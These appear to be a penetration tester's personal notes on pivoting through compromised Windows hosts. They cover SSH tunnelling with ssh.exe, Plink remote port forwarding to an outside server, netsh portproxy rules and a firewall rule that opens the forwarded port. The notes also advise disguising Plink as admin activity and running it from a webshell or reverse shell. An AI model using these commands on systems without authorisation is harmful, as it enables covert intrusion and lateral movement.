* ssh.exe:
	* On Windows scp.exe, sftp.exe, ssh.exe, along with other ssh- utilities can be found in `%systemdrive%\Windows\System32\OpenSSH` location by default.
	* ssh.exe can be used to forward packets using SSH tunneling. Techniques in [[SSH Tunneling]] can used here.
* Plink:
	* Plink is a commandline SSH tool used on Windows before OpenSSH was available on Windows. 
	* One reason to use Plink is that is a popular tool used by network admins and can be masked as legitimate activity if OpenSSH is not available on the machine.
	* Note: Plink does not support remote dynamic port forwarding.
	* On kali Plink can be found on `/usr/share/windows-resources/binaries/plink.exe`. Transfer the binary to the victim Windows host.
	* Example SSH remote port forwarding: `C:\Windows\Temp\plink.exe -ssh -l user -pw <YOUR PASSWORD HERE> -R 127.0.0.1:port1:ip2:port2 ssh_server_ip`
	* Plink may have issues in a non-tty shell like in a webshell or reverse shell. Try `cmd.exe /c echo y | .\plink.exe -ssh -l user -pw <YOUR PASSWORD HERE> -R 127.0.0.1:port1:ip2:port2 ssh_server_ip`
* Netsh:
	* Use Netsh to open a port proxy for port forwarding.
	* Note Netsh needs administrative privileges. This means UAC might be needed and access to something like RDP is preferable.
	* `netsh interface portproxy add v4tov4 listenport=<listen_port> listenaddress=<listen_address> connectport=<connect_port> connectaddress=<connect_address>` 
	* Incase the firewall blocks connections to `listen_address:listen_port`, then add a rule to firewall to allow connections: `netsh advfirewall firewall add rule name="<rule name>" protocol=TCP dir=in localip=<listen_address> localport=<listen_port> action=allow`
	* PowerShell cmdlets for firewall can also be used instead of netsh.
